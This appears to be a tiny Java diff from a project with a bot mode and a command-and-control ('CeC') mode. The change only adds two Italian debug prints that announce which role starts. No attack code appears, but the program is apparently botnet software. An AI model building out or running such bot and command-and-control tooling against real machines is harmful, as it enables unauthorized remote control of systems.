@@ -56,9 +56,11 @@ public class Application {
 				configEngine.setCommandandconquerStatus(true);
 			
 			if (!configEngine.isCommandandconquerStatus()) {
+				System.out.println("SONO UN BOT");
 				bot.initializeBot();
 
 			} else {
+				System.out.println("SONO UN CEC");
 				cec.initializeCeC();
 
 			}
